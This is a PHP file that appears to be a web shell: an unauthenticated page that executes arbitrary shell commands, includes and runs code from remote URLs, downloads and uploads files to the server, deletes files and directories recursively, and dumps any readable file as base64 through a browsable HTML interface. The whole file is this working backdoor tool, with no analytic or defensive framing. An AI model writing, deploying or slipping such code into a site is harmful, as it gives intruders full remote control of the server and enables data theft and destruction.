<?php

function permission($filename)
{
	$perms = fileperms($filename);

	if (($perms & 0xC000) == 0xC000)     { $info = 's'; }	
	elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; }
	elseif (($perms & 0x8000) == 0x8000) { $info = '-'; }
	elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; }
	elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; }
	elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; }
	elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; }
	else                                 { $info = 'u'; }

	//owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

	//group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

	//all
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

	return $info;
}


function getContent($dir, $type)
{
	if ($dir[strlen($dir)-1] != '/') $dir .= '/';

	//if not a directory return empty array
	if (!is_dir($dir)) return array();

	//iterate through directory
	$dir_handle  = opendir($dir);
	$dir_objects = array();
	while ($object = readdir($dir_handle))
	{
		$filename    = $dir.$object;
		
		if (filetype($filename) !== $type)
			continue;
	
		$file_object = array(
		'name' => $object,
		'size' => filesize($filename),
		'perm' => permission($filename),
		'type' => filetype($filename),
		'path' => $filename,
		'time' => date("d F Y H:i:s", filemtime($filename))
		);
			
		$dir_objects[] = $file_object;
	}  	

	asort($dir_objects);
	return $dir_objects;
}


function unlinkDirectoryRecursive($dir)
{
	if ($dir[strlen($dir)-1] == '/')
		$dir = substr($dir, 0, -1);

	if(!$dh = opendir($dir))
		return 0;

	while (false !== ($obj = readdir($dh)))
	{
		if($obj == '.' || $obj == '..')
		{
			continue;
		}
		
		$filename = $dir.$obj;

		//ignore directories
		if (filetype($filename) == "dir")
			unlinkDirectoryRecursive($dir.'/'.$obj);
		else
			unlink($dir . '/' . $obj);       
	}
	closedir($dh);   
    	
	return rmdir($dir);    	
}



function remoteDownload($url, $put)
{
	$fr = fopen($url,"rb");
	if (!$fr)
		return 404;

	$fw = fopen($put,"wb");
	if(!$fw)
		return 401;

	while(!feof($fr)) {
    	fwrite($fw, fread($fr, 1024 * 8 ), 1024 * 8 );
  	}

	fclose($fr);
	fclose($fw);
	
	return 1;
}



function cmd_exec($cmd, &$stdout, &$stderr)
{
	$outfile = tempnam(".", "cmd");
	$errfile = tempnam(".", "err");
   
	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("file", $outfile, "w"),
		2 => array("file", $errfile, "w")
   	);

   	$proc = proc_open($cmd, $descriptorspec, $pipes);
   	if (!is_resource($proc)) return 255;

   	fclose($pipes[0]);

	$exitCode = proc_close($proc);

   	$stdout = file($outfile);
   	$stderr = file($errfile);

	foreach ($stdout as $line)
	{
		echo htmlspecialchars($line)."<br>";
	}
	
	foreach ($stderr as $line)
	{
		echo htmlspecialchars($line)."<br>";
	}

   	unlink($outfile);
   	unlink($errfile);

   	return $exitCode;
}



	//Set no limit for execution time
	set_time_limit(0);
	ini_set("max_execution_time","0");


	//set cwd
	if (isset($_POST['changeDirectory']))
	{
		chdir($_POST['changeDirectory']);
	}
	
	
	echo '<div style="background-color:#000000">';
	echo '<font face="courier" size="3" color="#FFFFFF">';
	
	if (isset($_POST['rfiUrl']))
	{
		$url = $_POST["rfiUrl"];
		echo 'Including <b>'.htmlspecialchars($url).'</b>...';
		include($url);
	}
	else if (isset($_POST['showContent']))
	{
		$fileName = $_POST["showContent"];
		if ((is_file($fileName)) && (is_readable($fileName)))
		{
			$in = file_get_contents($fileName);
			$enc = base64_encode($in);
			echo $enc;
		}
		else
		{
			echo "File ".$fileName." does not exist or you have not enough rights!"."<br>";
		}
	}
	else if (isset($_POST['removeDirectory']))
	{
		$dir = ($_POST['removeDirectory']);
		if (unlinkDirectoryRecursive($dir))
				echo "Removing succesful!"."<br>";
			else
				echo "Removing failed! Perhaps files in use or not enough rights"."<br>";
	}
	else if (isset($_POST['removeFile']))
	{
		$file = ($_POST['removeFile']);
			if (unlink($file))
				echo "Removing succesful!"."<br>";
			else
				echo "Removing failed! Perhaps file in use or not enough rights"."<br>";
	}

	else if(isset($_POST["cmd"]))
	{		
		$cmd = stripslashes($_POST["cmd"]);					
		echo "Command: <b>".htmlspecialchars($cmd)."</b><br><br>";
		
		$exit = cmd_exec($cmd, $stdout, $stderr);
		if ($exit == 255)			
			echo "Could not command execute! Please try shell execute"."<br>";			
		else
			echo "<br>Command Exit Code: ".$exit."<br>";
	}
	else if(isset($_POST["shell"]))
	{		
		$cmd = $_POST["shell"];					
		echo "Command: <b>".htmlspecialchars($cmd)."</b><br>";

		echo htmlspecialchars(shell_exec($cmd))."<br>";							
	}
	else if(isset($_POST["downloadUrl"]))
	{		
		$url = ($_POST["downloadUrl"]);
		
		$fileName = basename($url);
		echo "Downloading <b>".htmlspecialchars($url)."</b>...<br>";
		
		$result = remoteDownload($url, $fileName);			
		if ($result == 401)
			echo "No Permission to write in current working dir ".htmlspecialchars($cwd)."<br>";
		else if ($result == 404)
			echo "Could not find remote file!"."<br>";
		else
			echo "Upload successful!"."<br>";
	}
	else if(isset($_FILES))
	{
		if (sizeof($_FILES)!=0)
		{	
			if ($_FILES["file"]["error"] > 0)
			{
				echo "Error: " . $_FILES["file"]["error"] . "<br>";
			}
			if (!empty($_FILES['file']))
			{	
				echo "Uploaded: ".htmlspecialchars($_FILES["file"]["tmp_name"])."<br>";
  				echo "Type: ".htmlspecialchars($_FILES["file"]["type"])."<br>";
  				echo "Size: ".htmlspecialchars(($_FILES["file"]["size"] / 1024))." Kb<br>";
  				echo "Moving to: ".htmlspecialchars($cwd).htmlspecialchars($_FILES["file"]["name"])."<br>";  
			
				$result = move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);		
				if (!$result)								
					echo "Moving failed! Check file input and your rights!"."<br>";
				else
					echo "Moving succesful!"."<br>";
			}
		}
	}


	
	$cwd= getcwd();
	if ($cwd[strlen($cwd)-1] != '/')
		$cwd .= '/';
	
	echo "Current Working Directory: ".$cwd."<br>";
	echo "Current Url: ".$_SERVER['REQUEST_URI']."<br>"; 
	
	
	$directories = getContent($cwd, 'dir');
	$files = getContent($cwd, 'file');
		
	
	echo '
		<table border="1" style="background-color:orange" width="100%">
			<tr>
				<th>Name</th>
				<th>Size</th>
				<th>Permission</th>
    			<th>Type</th>
    			<th>Time</th>
				<th>Commands</th>
  			</tr>';

			
	foreach ($directories as $dir)
	{
		echo '		
  			<tr>
				<td>'.$dir['name'].'</td>	
				<td>'.$dir['size'].'</td>
				<td>'.$dir['perm'].'</td>
				<td>'.$dir['type'].'</td>
				<td>'.$dir['time'].'</td>
				<td>
					<form method="POST">
						<input type="hidden" name="changeDirectory" value='.$dir['path'].'>
						<input type="submit" value="OPEN">
					</form>
					<form method="POST">
						<input type="hidden" name="removeDirectory" value='.$dir['path'].'>
						<input type="hidden" name="changeDirectory" value='.$cwd.'>
						<input type="submit" value="REMOVE">
					</form>
				</td>
  			</tr>';		
	}
	
	foreach ($files as $file)
	{
		echo '		
  			<tr>
				<td>'.$file['name'].'</td>	
				<td>'.$file['size'].'</td>
				<td>'.$file['perm'].'</td>
				<td>'.$file['type'].'</td>
				<td>'.$file['time'].'</td>
				<td>
					<form method="POST">
						<input type="hidden" name="showContent" value='.$file['path'].'>
						<input type="hidden" name="changeDirectory" value='.$cwd.'>
						<input type="submit" value="BASE64">
					</form>
					<form method="POST">
						<input type="hidden" name="removeFile" value='.$file['path'].'>
						<input type="hidden" name="changeDirectory" value='.$cwd.'>
						<input type="submit" value="REMOVE">
					</form>
				</td>
  			</tr>';		
	}
	echo '</table>';
	
	
	echo '<br>Command Execution:';
	echo '<form method="POST">';
	echo	'<input type="hidden" name="changeDirectory" value='.$cwd.'>';
	echo 	'<input type="text" name="cmd" size="100">';
	echo 	'<input type="submit" value="Execute">';
	echo '</form>';
	
	echo 'Shell Execution (RAW):';
	echo '<form method="POST">';
	echo	 '<input type="hidden" name="changeDirectory" value='.$cwd.'>';
	echo	 '<input type="text" name="shell" size="100">';
	echo	 '<input type="submit" value="Execute">';
	echo '</form>';
	
	
	echo 'Remote Download (URL):';
	echo '<form method="POST">';
	echo 	'<input type="hidden" name="changeDirectory" value='.$cwd.'>';
	echo 	'<input type="text" name="downloadUrl" size="100">';
	echo 	'<input type="submit" value="Download">';
	echo '</form>';	
	
	echo 'Remote File Inclusion (URL):';
	echo '<form method="POST">';	
	echo 	'<input type="hidden" name="changeDirectory" value='.$cwd.'>';
	echo 	'<input type="text" name="rfiUrl" size="100">';	
	echo 	'<input type="submit" value="Include">';
	echo '</form>';	
	
	echo 'File Upload:';
	echo '<form method="POST" enctype="multipart/form-data">';
	echo 	'<input type="hidden" name="changeDirectory" value='.$cwd.'>';
	echo 	'<input type="file" name="file" size="100">';	
	echo 	'<input type="submit" value="Upload">';
	echo '</form>';	
	
	echo '</font></div>';
?> 